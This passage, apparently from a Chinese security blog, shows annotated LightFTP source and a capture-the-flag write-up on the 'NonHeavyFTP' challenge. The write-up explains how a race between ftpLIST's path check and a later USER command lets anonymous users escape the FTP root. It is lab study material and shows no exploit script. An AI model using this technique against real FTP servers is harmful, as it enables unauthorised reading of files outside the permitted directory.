class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( params == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error501);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(temptext, <span class="number">0</span>, <span class="keyword">sizeof</span>(temptext));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * we have login name saved in context-&gt;FileName from USER command</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!config_parse(g_cfg.ConfigFile, context-&gt;FileName, <span class="string">&quot;pswd&quot;</span>, temptext, <span class="keyword">sizeof</span>(temptext))) <span class="comment">/* 提取密码 */</span></span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error530_r);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( (<span class="built_in">strcmp</span>(temptext, params) == <span class="number">0</span>) || (temptext[<span class="number">0</span>] == <span class="string">&#x27;*&#x27;</span>) )</span><br><span class="line">    &#123; <span class="comment">/* 密码匹配成功,或者密码设置为&#x27;*&#x27; */</span></span><br><span class="line">        <span class="built_in">memset</span>(context-&gt;RootDir, <span class="number">0</span>, <span class="keyword">sizeof</span>(context-&gt;RootDir));</span><br><span class="line">        <span class="built_in">memset</span>(temptext, <span class="number">0</span>, <span class="keyword">sizeof</span>(temptext));</span><br><span class="line"></span><br><span class="line">        config_parse(g_cfg.ConfigFile, context-&gt;FileName, <span class="string">&quot;root&quot;</span>, context-&gt;RootDir, <span class="keyword">sizeof</span>(context-&gt;RootDir)); <span class="comment">/* 提取根目录路径 */</span></span><br><span class="line">        config_parse(g_cfg.ConfigFile, context-&gt;FileName, <span class="string">&quot;accs&quot;</span>, temptext, <span class="keyword">sizeof</span>(temptext)); <span class="comment">/* 提取登录设置 */</span></span><br><span class="line"></span><br><span class="line">        context-&gt;Access = FTP_ACCESS_NOT_LOGGED_IN;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( strcasecmp(temptext, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> ) &#123; </span><br><span class="line">                <span class="comment">/* 登录设置为&quot;admin&quot;:启用所有功能 */</span></span><br><span class="line">                context-&gt;Access = FTP_ACCESS_FULL;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( strcasecmp(temptext, <span class="string">&quot;upload&quot;</span>) == <span class="number">0</span> ) &#123; </span><br><span class="line">                <span class="comment">/* 登录设置为&quot;upload&quot;:</span></span><br><span class="line"><span class="comment">                允许:创建新目录,存储新文件附加</span></span><br><span class="line"><span class="comment">                禁用:重命名,删除 */</span></span><br><span class="line">                context-&gt;Access = FTP_ACCESS_CREATENEW;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( strcasecmp(temptext, <span class="string">&quot;readonly&quot;</span>) == <span class="number">0</span> ) &#123; </span><br><span class="line">                <span class="comment">/* 登录设置为&quot;readonly&quot;:只需读取目录和下载文件 */</span></span><br><span class="line">                context-&gt;Access = FTP_ACCESS_READONLY;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sendstring(context, error530_b);</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        writelogentry(context, <span class="string">&quot; PASS-&gt;successful logon&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error530_r);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sendstring(context, success230);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>列出目标目录中所有的文件：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftpLIST</span><span class="params">(PFTPCONTEXT context, <span class="keyword">const</span> <span class="keyword">char</span> *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">stat</span>	<span class="title">filestats</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span>		tid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (context-&gt;Access == FTP_ACCESS_NOT_LOGGED_IN)</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error530); </span><br><span class="line">    <span class="keyword">if</span> (context-&gt;WorkerThreadValid == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, <span class="keyword">error550_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (params != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">strcmp</span>(params, <span class="string">&quot;-a&quot;</span>) == <span class="number">0</span>) || (<span class="built_in">strcmp</span>(params, <span class="string">&quot;-l&quot;</span>) == <span class="number">0</span>))</span><br><span class="line">            params = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ftp_effective_path(context-&gt;RootDir, context-&gt;CurrentDir, params, <span class="keyword">sizeof</span>(context-&gt;FileName), context-&gt;FileName); <span class="comment">/* 通过设置的根目录来获取目标目录的绝对路径(结果存放于context-&gt;FileName) */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (stat(context-&gt;FileName, &amp;filestats) == <span class="number">0</span>)</span><br><span class="line">    &#123; <span class="comment">/* 使用stat函数获取文件信息(已经获取了文件的绝对路径) */</span> </span><br><span class="line">        <span class="keyword">if</span> ( !S_ISDIR(filestats.st_mode) ) <span class="comment">/* filestats.st_mode是否是一个目录 */</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        sendstring(context, interm150);</span><br><span class="line">        writelogentry(context, <span class="string">&quot; LIST&quot;</span>, (<span class="keyword">char</span> *)params);</span><br><span class="line">        context-&gt;WorkerThreadAbort = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        pthread_mutex_lock(&amp;context-&gt;MTLock);</span><br><span class="line"></span><br><span class="line">        context-&gt;WorkerThreadValid = pthread_create(&amp;tid, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))list_thread, context); </span><br><span class="line">        <span class="comment">/* 设置一个线程</span></span><br><span class="line"><span class="comment">        用于完成:打开目录,读取文件信息,组织输出等一系列工作 */</span></span><br><span class="line">        <span class="keyword">if</span> ( context-&gt;WorkerThreadValid == <span class="number">0</span> )</span><br><span class="line">            context-&gt;WorkerThreadId = tid;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            sendstring(context, error451);</span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;context-&gt;MTLock);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sendstring(context, error550);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>从服务器上下载目标文件：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftpRETR</span><span class="params">(PFTPCONTEXT context, <span class="keyword">const</span> <span class="keyword">char</span> *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">stat</span>	<span class="title">filestats</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span>		tid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (context-&gt;Access == FTP_ACCESS_NOT_LOGGED_IN)</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error530);</span><br><span class="line">    <span class="keyword">if</span> (context-&gt;WorkerThreadValid == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, <span class="keyword">error550_t</span>);</span><br><span class="line">    <span class="keyword">if</span> ( params == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error501);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( context-&gt;File != <span class="number">-1</span> ) &#123;</span><br><span class="line">        close(context-&gt;File);</span><br><span class="line">        context-&gt;File = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ftp_effective_path(context-&gt;RootDir, context-&gt;CurrentDir, params, <span class="keyword">sizeof</span>(context-&gt;FileName), context-&gt;FileName); <span class="comment">/* 获取目标文件的绝对路径 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (stat(context-&gt;FileName, &amp;filestats) == <span class="number">0</span>)</span><br><span class="line">    &#123; <span class="comment">/* 获取该文件的状态 */</span></span><br><span class="line">        <span class="keyword">if</span> ( S_ISDIR(filestats.st_mode) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        sendstring(context, interm150);</span><br><span class="line">        writelogentry(context, <span class="string">&quot; RETR: &quot;</span>, (<span class="keyword">char</span> *)params);</span><br><span class="line">        context-&gt;WorkerThreadAbort = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        pthread_mutex_lock(&amp;context-&gt;MTLock);</span><br><span class="line"></span><br><span class="line">        context-&gt;WorkerThreadValid = pthread_create(&amp;tid, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))retr_thread, context); <span class="comment">/* 设置一个线程来完成下载操作 */</span></span><br><span class="line">        <span class="keyword">if</span> ( context-&gt;WorkerThreadValid == <span class="number">0</span> )</span><br><span class="line">            context-&gt;WorkerThreadId = tid;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            sendstring(context, error451);</span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;context-&gt;MTLock);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sendstring(context, error550);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">f = open(context-&gt;FileName, O_RDONLY); <span class="comment">/* 打开目标文件 */</span></span><br><span class="line">context-&gt;File = f;</span><br><span class="line"><span class="keyword">if</span> (f == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">offset = lseek(f, context-&gt;RestPoint, SEEK_SET); <span class="comment">/* 重新设置文件指针(如果文件过大则需要分多次进行传输) */</span></span><br><span class="line"><span class="keyword">if</span> (offset != context-&gt;RestPoint)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">sent_ok = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> ( context-&gt;WorkerThreadAbort == <span class="number">0</span> ) &#123;</span><br><span class="line">    sz = read(f, buffer, buffer_size); <span class="comment">/* 把文件内容读取到本地内存 */</span></span><br><span class="line">    <span class="keyword">if</span> (sz == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sz &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sent_ok = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (send_auto(clientsocket, TLS_datasession, buffer, sz) == sz) </span><br><span class="line">    &#123; <span class="comment">/* 发送数据到客户端 */</span></span><br><span class="line">        sz_total += sz; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sent_ok = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/12/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89+FTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/01/12/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89+FTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E6%9E%90/" class="post-title-link" itemprop="url">条件竞争+FTP协议简析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-01-12 13:37:15" itemprop="dateCreated datePublished" datetime="2023-01-12T13:37:15+08:00">2023-01-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-01-21 11:06:42" itemprop="dateModified" datetime="2023-01-21T11:06:42+08:00">2023-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>NonHeavyFTP</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fftp: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=dd778d889ef0dab05153ea682e9ad1ad3d493130, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped    </span><br><span class="line">[!] Could <span class="keyword">not</span> populate PLT: invalid syntax (unicorn.py, line <span class="number">110</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/NonHeavyFTP/fftp&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>环境搭建</strong></p>
<p>查看 Dockerfile：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:<span class="number">22.04</span></span><br><span class="line"></span><br><span class="line">ENV DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line">RUN apt-get update &amp;&amp;\</span><br><span class="line">    apt-get install -y --no-install-recommends wget unzip gcc make libc6-dev gnutls-dev uuid</span><br><span class="line"></span><br><span class="line">RUN mkdir -p /server/data/ &amp;&amp;\</span><br><span class="line">    echo <span class="string">&quot;hello from LightFTP&quot;</span> &gt;&gt; /server/data/hello.txt &amp;&amp;\</span><br><span class="line">    cd /server &amp;&amp;\</span><br><span class="line">    wget --no-check-certificate https:<span class="comment">//codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip &amp;&amp;\</span></span><br><span class="line"><span class="comment">    unzip LightFTP-2.2.zip &amp;&amp;\</span></span><br><span class="line"><span class="comment">    cd LightFTP-2.2/Source/Release &amp;&amp;\</span></span><br><span class="line"><span class="comment">    make &amp;&amp;\</span></span><br><span class="line"><span class="comment">    cp -a ./fftp /server/ &amp;&amp;\</span></span><br><span class="line"><span class="comment">    cd /server &amp;&amp;\</span></span><br><span class="line"><span class="comment">    rm -rf LightFTP-2.2 LightFTP-2.2.zip</span></span><br><span class="line"></span><br><span class="line">COPY ./flag /flag</span><br><span class="line">COPY ./fftp.conf /server/fftp.conf</span><br><span class="line"></span><br><span class="line">RUN mv /flag /flag.`uuid` &amp;&amp;\</span><br><span class="line">    useradd -M -d /server/ -U ftp</span><br><span class="line"></span><br><span class="line">WORKDIR /server</span><br><span class="line"></span><br><span class="line">EXPOSE <span class="number">2121</span></span><br><span class="line"></span><br><span class="line">CMD [<span class="string">&quot;runuser&quot;</span>, <span class="string">&quot;-u&quot;</span>, <span class="string">&quot;ftp&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;ftp&quot;</span>, <span class="string">&quot;/server/fftp&quot;</span>, <span class="string">&quot;/server/fftp.conf&quot;</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li>修改了 flag 文件的名称</li>
<li>源码下载地址为：<a target="_blank" rel="noopener" href="https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2">https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2</a></li>
</ul>
<p>搭建 docker 环境：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t <span class="string">&quot;fftp&quot;</span> .</span><br></pre></td></tr></table></figure>
<p>启动 docker：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p <span class="number">2121</span>:<span class="number">2121</span> fftp:latest /bin/sh</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[ftpconfig]</span><br><span class="line">port=<span class="number">2121</span> <span class="comment">/* 要将服务器绑定到的端口号 */</span></span><br><span class="line">maxusers=<span class="number">10000000</span> <span class="comment">/* 与服务器的最大连接数,可同时建立 */</span></span><br><span class="line">interface=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="comment">/* 要绑定到的接口IP,使用0.0.0.0侦听任何可用接口,默认值:127.0.0.1 */</span></span><br><span class="line">local_mask=<span class="number">255.255</span><span class="number">.255</span><span class="number">.255</span> <span class="comment">/* 本地网络的IP掩码,这将有助于服务器区分本地客户端和互联网客户端,默认值:255.255.255.0 */</span></span><br><span class="line"></span><br><span class="line">minport=<span class="number">30000</span> <span class="comment">/* 数据连接的端口范围,您可以使用它在网关设备上配置端口转发 */</span></span><br><span class="line">maxport=<span class="number">60000</span></span><br><span class="line"></span><br><span class="line">goodbyemsg=Goodbye!</span><br><span class="line">keepalive=<span class="number">1</span> <span class="comment">/* 发送激活数据包(某些NAT可能需要这样做) */</span></span><br><span class="line"></span><br><span class="line">[anonymous]</span><br><span class="line">pswd=* <span class="comment">/* 表示“任何密码都匹配” */</span></span><br><span class="line">accs=readonly <span class="comment">/* 不允许登录 */</span></span><br><span class="line">root=/server/data/</span><br></pre></td></tr></table></figure>
<ul>
<li>开启了匿名登录</li>
</ul>
<p>在 <code>ftpLIST</code> 函数中还有一个条件竞争漏洞，之后再谈</p>
<p><strong>入侵思路</strong></p>
<p>利用匿名登录漏洞可以直接连接服务器：</p>
<p><img src="/2023/01/12/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89+FTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E6%9E%90/1673071731371.png" alt="1673071731371"> </p>
<ul>
<li><code>root=/server/data</code>：把 ftp 服务端的目录设置为 <code>/server/data</code></li>
</ul>
<p>通过 Dockerfile 可以发现 flag 在根目录中，接下来的目标就是利用 ftp 服务器的功能来获取根目录中的 flag</p>
<ul>
<li>这篇博客中讲解了如何实现 ftp 客户端：<a target="_blank" rel="noopener" href="https://blog.csdn.net/jenie/article/details/106825292">c语言实现ftp客户端</a></li>
<li>当然也可以使用 Linux 中的 ftp 命令来连接</li>
<li>直接使用 <code>pwntools</code> 的 <code>remote</code> 模块也行</li>
</ul>
<p>分析 Dockerfile 可以发现：</p>
<ul>
<li>flag 文件在根目录中，而我们只能控制 <code>/server/data</code> 目录</li>
<li>接下来的目标就是跳出程序的限制，从而读取出 flag</li>
</ul>
<p>本程序最关键的一个漏洞如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftpLIST</span><span class="params">(PFTPCONTEXT context, <span class="keyword">const</span> <span class="keyword">char</span> *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 验证目标目录路径 */</span></span><br><span class="line">    ftp_effective_path(context-&gt;RootDir, context-&gt;CurrentDir, params, <span class="keyword">sizeof</span>(context-&gt;FileName), context-&gt;FileName); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (stat(context-&gt;FileName, &amp;filestats) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !S_ISDIR(filestats.st_mode) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        sendstring(context, interm150);</span><br><span class="line">        writelogentry(context, <span class="string">&quot; LIST&quot;</span>, (<span class="keyword">char</span> *)params);</span><br><span class="line">        context-&gt;WorkerThreadAbort = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        pthread_mutex_lock(&amp;context-&gt;MTLock);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 创建list_thread线程来执行LIST命令 */</span></span><br><span class="line">        context-&gt;WorkerThreadValid = pthread_create(&amp;tid, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))list_thread, context);</span><br><span class="line">        </span><br><span class="line">        ......</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sendstring(context, error550);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>先调用 <code>ftp_effective_path</code> 检查文件路径</li>
<li>再创建 <code>list_thread</code> 来执行 LIST 命令</li>
</ul>
<p>关于“被动模式”：</p>
<ul>
<li>当 FTP 处于“被动模式”时，数据将使用新套接字 socket 传输</li>
<li>在 <code>create_datasocket</code> 函数中（<code>list_thread</code> 中会调用这个函数），线程会卡在 <code>accept</code> 函数中，等待客户端连接</li>
<li>当客户端进行连接时，它将读取 <code>context-&gt;FileName</code> 的文件目录</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">list_thread</span><span class="params">(PFTPCONTEXT context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">volatile</span> SOCKET     clientsocket;</span><br><span class="line">    <span class="keyword">gnutls_session_t</span>	TLS_datasession;</span><br><span class="line">    <span class="keyword">int</span>					ret;</span><br><span class="line">    DIR					*pdir;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span>		*<span class="title">entry</span>;</span></span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;context-&gt;MTLock);</span><br><span class="line">    pthread_cleanup_push(cleanup_handler, context);</span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line">    TLS_datasession = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    clientsocket = create_datasocket(context);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>PFTPCONTEXT</code> 是一个指针</li>
</ul>
<p>在“被动模式”下，程序先检查文件路径，然后卡在 <code>create_datasocket</code> 函数中</p>
<p>如果此时修改 <code>create_datasocket</code> 函数的参数 <code>context</code>，就可以跳出 <code>/server/data</code> 的限制（已经检查过文件路径了）</p>
<p>具体可以使用 <code>ftpUSER</code> 函数来修改 <code>context</code>：</p>
